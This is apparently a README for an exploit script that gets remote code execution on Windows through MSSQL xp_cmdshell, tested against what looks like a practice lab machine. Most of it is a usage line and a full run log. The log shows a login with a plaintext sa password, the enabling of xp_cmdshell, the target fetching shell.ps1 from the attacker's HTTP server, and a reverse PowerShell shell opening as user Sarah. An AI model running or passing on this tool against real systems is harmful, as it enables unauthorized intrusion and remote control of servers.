# mssql_xpcmdshell_rce

## Summary

Gets code execution on windows server through mssql 'xp_cmdshell'.

## Usage

Run ./mssql_xpcmdshell_rce to get the usage menu.

```sh
./mssql_xpcmdshell_rce.py

• ▌ ▄ ·. .▄▄ · .▄▄ · .▄▄▄  ▄▄▌  ▐▄• ▄  ▄▄▄· ▄▄· • ▌ ▄ ·. ·▄▄▄▄  .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  ▄▄▄   ▄▄· ▄▄▄ .
·██ ▐███▪▐█ ▀. ▐█ ▀. ▐▀•▀█ ██•   █▌█▌▪▐█ ▄█▐█ ▌▪·██ ▐███▪██▪ ██ ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  ▀▄ █·▐█ ▌▪▀▄.▀·
▐█ ▌▐▌▐█·▄▀▀▀█▄▄▀▀▀█▄█▌·.█▌██▪   ·██·  ██▀·██ ▄▄▐█ ▌▐▌▐█·▐█· ▐█▌▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██ ██▌▐█▌▐█▄▪▐█▐█▄▪▐█▐█▪▄█·▐█▌▐▌▪▐█·█▌▐█▪·•▐███▌██ ██▌▐█▌██. ██ ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌▐█•█▌▐███▌▐█▄▄▌
▀▀  █▪▀▀▀ ▀▀▀▀  ▀▀▀▀ ·▀▀█. .▀▀▀ •▀▀ ▀▀.▀   ·▀▀▀ ▀▀  █▪▀▀▀▀▀▀▀▀•  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ .▀  ▀·▀▀▀  ▀▀▀

Usage: ./mssql_xpcmdshell_rce.py <HOST> <LHOST> <LPORT> <USERNAME> <PASSWORD>

EXAMPLE: ./mssql_xpcmdshell_rce.py 10.10.10.59 10.10.14.24 1337 <USERNAME> <PASSWORD>
```        

Run the exploit.

```sh
mssql_xpcmdshell_rce  master ⦿ ./mssql_xpcmdshell_rce.py 10.10.10.59 10.10.14.24 1337 'sa' 'GWE3V65#6KFH93@4GWTG2G'
[+] LHOST = 10.10.14.24
[+] Netcat = 1337
[+] HTTP Listen = 8000
[+] Successful login at mssql server 10.10.10.59 with username sa and password GWE3V65#6KFH93@4GWTG2G
[+] Enabling 'xp_cmdshell'
10.10.10.59 - - [17/Jul/2018 11:57:27] "GET /shell.ps1 HTTP/1.1" 200 -
Connection from 10.10.10.59:58861
Windows PowerShell running as user Sarah on TALLY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>
```